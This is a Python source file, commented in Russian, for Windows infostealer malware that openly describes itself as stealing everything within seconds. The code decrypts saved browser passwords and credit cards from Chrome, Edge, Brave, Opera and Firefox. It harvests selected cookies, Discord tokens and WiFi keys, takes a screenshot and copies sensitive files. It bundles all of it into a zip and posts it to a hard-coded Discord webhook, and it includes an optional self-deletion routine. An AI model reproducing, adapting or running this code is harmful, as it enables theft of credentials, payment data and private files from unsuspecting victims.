import os
import sys
import json
import time
import shutil
import sqlite3
import platform
import subprocess
import requests
import base64
import re
import win32crypt
import browser_cookie3
from cryptography.fernet import Fernet
from datetime import datetime
import ctypes
import winreg
import psutil
import glob

# ============================================
# МГНОВЕННЫЙ СБОРЩИК ВСЕХ ДАННЫХ
# Запустил - и всё украл за секунды
# ============================================

class InstantStealer:
    def __init__(self):
        self.temp_dir = os.environ['TEMP'] + "\\sysupdate_temp"
        self.output_file = os.environ['TEMP'] + "\\system_data.txt"
        self.webhook_url = "https://discord.com/api/webhooks/1482748674051280956/PEw6k8gNswqcGnBN5DUWPJdj9J31Usy4B-12ZpMSR7QJbmYCGTMZJPNp08hjtQWsphIn"  # ВСТАВЬ СВОЙ WEBHOOK
        
        # Создаем временную папку
        if not os.path.exists(self.temp_dir):
            os.makedirs(self.temp_dir)
        
        # Сразу начинаем воровство
        self.steal_everything()
    
    # ============================================
    # 1. КРАЖА БРАУЗЕРНЫХ ДАННЫХ (cookies, пароли, карты)
    # ============================================
    
    def steal_browser_data(self):
        """Воровство всех браузерных данных"""
        browsers_data = []
        
        # A. Chrome и все Chromium браузеры
        chrome_paths = [
            os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data",
            os.environ['LOCALAPPDATA'] + "\\BraveSoftware\\Brave-Browser\\User Data",
            os.environ['LOCALAPPDATA'] + "\\Microsoft\\Edge\\User Data",
            os.environ['LOCALAPPDATA'] + "\\Yandex\\YandexBrowser\\User Data",
            os.environ['LOCALAPPDATA'] + "\\Opera Software\\Opera Stable",
            os.environ['LOCALAPPDATA'] + "\\Vivaldi\\User Data"
        ]
        
        for chrome_path in chrome_paths:
            if os.path.exists(chrome_path):
                # Находим все профили
                profiles = ['Default']
                for item in os.listdir(chrome_path):
                    if item.startswith('Profile'):
                        profiles.append(item)
                
                for profile in profiles:
                    profile_data = self.extract_chrome_profile(chrome_path, profile)
                    if profile_data:
                        browsers_data.extend(profile_data)
        
        # B. Firefox
        firefox_path = os.environ['APPDATA'] + "\\Mozilla\\Firefox\\Profiles"
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                profile_data = self.extract_firefox_profile(firefox_path + "\\" + profile)
                if profile_data:
                    browsers_data.extend(profile_data)
        
        # Сохраняем результаты
        with open(self.temp_dir + "\\browsers.json", 'w', encoding='utf-8') as f:
            json.dump(browsers_data, f, indent=2)
        
        return browsers_data
    
    def extract_chrome_profile(self, chrome_path, profile):
        """Извлечение данных из Chrome профиля"""
        data = []
        profile_path = chrome_path + "\\" + profile
        
        try:
            # Пароли
            login_db = profile_path + "\\Login Data"
            if os.path.exists(login_db):
                temp_db = self.temp_dir + "\\login_temp.db"
                shutil.copy2(login_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, username, password in cursor.fetchall():
                        try:
                            # Расшифровка пароля
                            decrypted = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                            data.append({
                                'browser': 'chrome',
                                'type': 'password',
                                'url': url,
                                'username': username,
                                'password': decrypted.decode('utf-8', errors='ignore')
                            })
                        except:
                            pass
                except:
                    pass
                
                conn.close()
                os.remove(temp_db)
            
            # Cookies
            cookies_db = profile_path + "\\Network\\Cookies"
            if os.path.exists(cookies_db):
                temp_db = self.temp_dir + "\\cookies_temp.db"
                shutil.copy2(cookies_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                try:
                    cursor.execute("SELECT host_key, name, value FROM cookies")
                    for host, name, value in cursor.fetchall():
                        if 'roblox' in host or 'discord' in host or 'facebook' in host:
                            data.append({
                                'browser': 'chrome',
                                'type': 'cookie',
                                'host': host,
                                'name': name,
                                'value': value
                            })
                except:
                    pass
                
                conn.close()
                os.remove(temp_db)
            
            # История
            history_db = profile_path + "\\History"
            if os.path.exists(history_db):
                temp_db = self.temp_dir + "\\history_temp.db"
                shutil.copy2(history_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                try:
                    cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                    for url, title, visits in cursor.fetchall():
                        data.append({
                            'browser': 'chrome',
                            'type': 'history',
                            'url': url,
                            'title': title,
                            'visits': visits
                        })
                except:
                    pass
                
                conn.close()
                os.remove(temp_db)
            
            # Кредитные карты
            webdata_db = profile_path + "\\Web Data"
            if os.path.exists(webdata_db):
                temp_db = self.temp_dir + "\\webdata_temp.db"
                shutil.copy2(webdata_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                try:
                    cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
                    for name, card_num, exp_month, exp_year in cursor.fetchall():
                        try:
                            decrypted = win32crypt.CryptUnprotectData(card_num, None, None, None, 0)[1]
                            data.append({
                                'browser': 'chrome',
                                'type': 'credit_card',
                                'name': name,
                                'card': decrypted.decode('utf-8', errors='ignore'),
                                'expiry': f"{exp_month}/{exp_year}"
                            })
                        except:
                            pass
                except:
                    pass
                
                conn.close()
                os.remove(temp_db)
        
        except Exception as e:
            pass
        
        return data
    
    def extract_firefox_profile(self, profile_path):
        """Извлечение данных из Firefox профиля"""
        data = []
        
        try:
            # logins.json (пароли)
            logins_file = profile_path + "\\logins.json"
            if os.path.exists(logins_file):
                with open(logins_file, 'r', encoding='utf-8') as f:
                    logins = json.load(f)
                    
                    for login in logins.get('logins', []):
                        data.append({
                            'browser': 'firefox',
                            'type': 'password',
                            'url': login.get('hostname'),
                            'username': base64.b64decode(login.get('encryptedUsername')).decode('utf-8', errors='ignore') if login.get('encryptedUsername') else '',
                            'password': base64.b64decode(login.get('encryptedPassword')).decode('utf-8', errors='ignore') if login.get('encryptedPassword') else ''
                        })
            
            # cookies.sqlite
            cookies_db = profile_path + "\\cookies.sqlite"
            if os.path.exists(cookies_db):
                temp_db = self.temp_dir + "\\ff_cookies.db"
                shutil.copy2(cookies_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                try:
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    for host, name, value in cursor.fetchall():
                        if any(x in host for x in ['roblox', 'discord', 'facebook', 'gmail', 'steam']):
                            data.append({
                                'browser': 'firefox',
                                'type': 'cookie',
                                'host': host,
                                'name': name,
                                'value': value
                            })
                except:
                    pass
                
                conn.close()
                os.remove(temp_db)
        
        except Exception as e:
            pass
        
        return data
    
    # ============================================
    # 2. КРАЖА ТОКЕНОВ DISCORD
    # ============================================
    
    def steal_discord_tokens(self):
        """Воровство Discord токенов"""
        tokens = []
        
        # Пути к Discord
        discord_paths = [
            os.environ['APPDATA'] + "\\discord",
            os.environ['APPDATA'] + "\\discordptb",
            os.environ['APPDATA'] + "\\discordcanary",
            os.environ['LOCALAPPDATA'] + "\\discord",
            os.environ['LOCALAPPDATA'] + "\\discordptb",
            os.environ['LOCALAPPDATA'] + "\\discordcanary"
        ]
        
        for discord_path in discord_paths:
            # Local Storage
            ls_path = discord_path + "\\Local Storage\\leveldb"
            if os.path.exists(ls_path):
                for file in os.listdir(ls_path):
                    if file.endswith('.ldb') or file.endswith('.log'):
                        try:
                            with open(ls_path + "\\" + file, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                
                                # Поиск токенов (формат Discord)
                                found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                found += re.findall(r'mfa\.[\w-]{84}', content)
                                
                                for token in found:
                                    if token not in tokens:
                                        tokens.append({
                                            'token': token,
                                            'source': discord_path
                                        })
                        except:
                            continue
        
        # Сохраняем
        with open(self.temp_dir + "\\discord_tokens.txt", 'w') as f:
            for token in tokens:
                f.write(token['token'] + "\n")
        
        return tokens
    
    # ============================================
    # 3. КРАЖА WIFI ПАРОЛЕЙ
    # ============================================
    
    def steal_wifi_passwords(self):
        """Воровство всех сохраненных WiFi паролей"""
        wifi_data = []
        
        try:
            # Получаем все профили WiFi
            profiles_output = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'], 
                capture_output=True, 
                text=True,
                encoding='cp866'
            ).stdout
            
            # Извлекаем имена профилей
            profiles = []
            for line in profiles_output.split('\n'):
                if 'Все профили пользователей' in line or 'All User Profile' in line:
                    profile = line.split(':')[1].strip()
                    profiles.append(profile)
            
            # Для каждого профиля получаем пароль
            for profile in profiles:
                try:
                    profile_output = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'],
                        capture_output=True,
                        text=True,
                        encoding='cp866'
                    ).stdout
                    
                    password = None
                    for line in profile_output.split('\n'):
                        if 'Содержимое ключа' in line or 'Key Content' in line:
                            password = line.split(':')[1].strip()
                            break
                    
                    wifi_data.append({
                        'ssid': profile,
                        'password': password
                    })
                except:
                    continue
            
            # Сохраняем
            with open(self.temp_dir + "\\wifi_passwords.txt", 'w', encoding='utf-8') as f:
                for wifi in wifi_data:
                    f.write(f"SSID: {wifi['ssid']}\nPassword: {wifi['password']}\n\n")
        
        except Exception as e:
            pass
        
        return wifi_data
    
    # ============================================
    # 4. КРАЖА СИСТЕМНОЙ ИНФОРМАЦИИ
    # ============================================
    
    def steal_system_info(self):
        """Воровство информации о системе"""
        info = {}
        
        # Базовая информация
        info['computer'] = platform.node()
        info['os'] = platform.system() + " " + platform.release()
        info['processor'] = platform.processor()
        
        # IP адрес
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
            info['public_ip'] = ip
        except:
            info['public_ip'] = 'Unknown'
        
        # Информация о пользователе
        info['username'] = os.getenv('USERNAME')
        info['userdomain'] = os.getenv('USERDOMAIN')
        
        # Информация о дисках
        drives = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                drives.append({
                    'drive': partition.mountpoint,
                    'total': usage.total,
                    'free': usage.free,
                    'used': usage.used
                })
            except:
                continue
        info['drives'] = drives
        
        # Скриншот экрана (мгновенно)
        try:
            import PIL.ImageGrab
            screenshot = PIL.ImageGrab.grab()
            screenshot.save(self.temp_dir + "\\screenshot.jpg", 'JPEG')
            info['screenshot'] = self.temp_dir + "\\screenshot.jpg"
        except:
            pass
        
        # Сохраняем
        with open(self.temp_dir + "\\system_info.json", 'w', encoding='utf-8') as f:
            json.dump(info, f, indent=2)
        
        return info
    
    # ============================================
    # 5. КРАЖА ФАЙЛОВ (БЫСТРЫЙ ПОИСК)
    # ============================================
    
    def steal_important_files(self):
        """Воровство важных файлов"""
        stolen_files = []
        
        # Важные расширения
        extensions = [
            # Документы
            '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.txt',
            # Базы данных
            '.sql', '.db', '.sqlite', '.mdb',
            # Кошельки
            '.wallet', '.key', '.pem',
            # Пароли
            '.kdbx', '.keepass',
            # Фото/видео
            '.jpg', '.jpeg', '.png', '.mp4'
        ]
        
        # Важные папки (только первые уровни для скорости)
        target_folders = [
            os.path.expanduser("~") + "\\Desktop",
            os.path.expanduser("~") + "\\Documents",
            os.path.expanduser("~") + "\\Downloads",
            os.path.expanduser("~") + "\\Pictures",
            "C:\\"
        ]
        
        # Ключевые слова в именах файлов
        keywords = ['pass', 'passw', 'login', 'account', 'bank', 'card', 'crypto', 
                   'wallet', 'secret', 'private', 'backup', '1xbet', 'dota', 'steam']
        
        for folder in target_folders:
            if not os.path.exists(folder):
                continue
            
            try:
                # Быстрый поиск (только 1 уровень глубины)
                for item in os.listdir(folder):
                    item_path = folder + "\\" + item
                    
                    if os.path.isfile(item_path):
                        # Проверяем расширение
                        ext = os.path.splitext(item)[1].lower()
                        if ext in extensions:
                            stolen_files.append(item_path)
                            continue
                        
                        # Проверяем ключевые слова в имени
                        if any(keyword in item.lower() for keyword in keywords):
                            stolen_files.append(item_path)
            except:
                continue
        
        # Копируем найденные файлы (максимум 20)
        copied_files = []
        for i, file_path in enumerate(stolen_files[:20]):
            try:
                dest = self.temp_dir + "\\file_" + str(i) + "_" + os.path.basename(file_path)
                shutil.copy2(file_path, dest)
                copied_files.append(dest)
            except:
                continue
        
        return copied_files
    
    # ============================================
    # 6. ОТПРАВКА ВСЕГО В DISCORD
    # ============================================
    
    def send_to_discord(self):
        """Отправка всех собранных данных в Discord"""
        
        # Собираем все в один архив
        archive_name = self.temp_dir + "\\all_data.zip"
        shutil.make_archive(self.temp_dir + "\\all_data", 'zip', self.temp_dir)
        
        # Создаем текстовый отчет
        report = "===== УКРАДЕННЫЕ ДАННЫЕ =====\n\n"
        report += f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Компьютер: {platform.node()}\n"
        report += f"Пользователь: {os.getenv('USERNAME')}\n\n"
        
        # Добавляем краткую информацию
        try:
            # Пароли браузеров
            if os.path.exists(self.temp_dir + "\\browsers.json"):
                with open(self.temp_dir + "\\browsers.json", 'r', encoding='utf-8') as f:
                    browsers = json.load(f)
                    passwords = [b for b in browsers if b.get('type') == 'password']
                    report += f"Найдено паролей: {len(passwords)}\n"
                    
                    # Показываем первые 10
                    for p in passwords[:10]:
                        report += f"URL: {p.get('url', 'N/A')}\n"
                        report += f"Login: {p.get('username', 'N/A')}\n"
                        report += f"Pass: {p.get('password', 'N/A')}\n\n"
            
            # Discord токены
            if os.path.exists(self.temp_dir + "\\discord_tokens.txt"):
                with open(self.temp_dir + "\\discord_tokens.txt", 'r') as f:
                    tokens = f.read()
                    report += f"Discord токены:\n{tokens}\n"
            
            # WiFi пароли
            if os.path.exists(self.temp_dir + "\\wifi_passwords.txt"):
                with open(self.temp_dir + "\\wifi_passwords.txt", 'r', encoding='utf-8') as f:
                    wifi = f.read()
                    report += f"WiFi пароли:\n{wifi}\n"
        except:
            pass
        
        # Сохраняем отчет
        with open(self.temp_dir + "\\report.txt", 'w', encoding='utf-8') as f:
            f.write(report)
        
        # Отправляем в Discord
        try:
            # Формируем multipart запрос
            import requests
            
            files = {}
            
            # Добавляем архив
            if os.path.exists(archive_name):
                files['file1'] = ('all_data.zip', open(archive_name, 'rb'), 'application/zip')
            
            # Добавляем отчет
            files['file2'] = ('report.txt', open(self.temp_dir + "\\report.txt", 'rb'), 'text/plain')
            
            # Добавляем скриншот
            if os.path.exists(self.temp_dir + "\\screenshot.jpg"):
                files['file3'] = ('screenshot.jpg', open(self.temp_dir + "\\screenshot.jpg", 'rb'), 'image/jpeg')
            
            # Отправляем
            response = requests.post(
                self.webhook_url,
                files=files,
                data={'content': f'Данные с {platform.node()}'}
            )
            
        except Exception as e:
            pass
    
    # ============================================
    # 7. ГЛАВНАЯ ФУНКЦИЯ - ВОРУЕТ ВСЁ
    # ============================================
    
    def steal_everything(self):
        """Запуск всех модулей кражи мгновенно"""
        
        try:
            # 1. Кража браузеров
            self.steal_browser_data()
            
            # 2. Кража Discord токенов
            self.steal_discord_tokens()
            
            # 3. Кража WiFi паролей
            self.steal_wifi_passwords()
            
            # 4. Кража системной информации
            self.steal_system_info()
            
            # 5. Кража важных файлов
            self.steal_important_files()
            
            # 6. Отправка всего в Discord
            self.send_to_discord()
            
        except Exception as e:
            pass
        
        # Самоуничтожение (опционально)
        # self.self_destruct()
    
    def self_destruct(self):
        """Самоуничтожение после кражи"""
        try:
            # Удаляем временные файлы
            shutil.rmtree(self.temp_dir, ignore_errors=True)
            
            # Удаляем сам файл
            time.sleep(2)
            os.remove(sys.argv[0])
        except:
            pass

# ============================================
# ЗАПУСК
# ============================================

if __name__ == "__main__":
    # Запускаем воровство
    stealer = InstantStealer()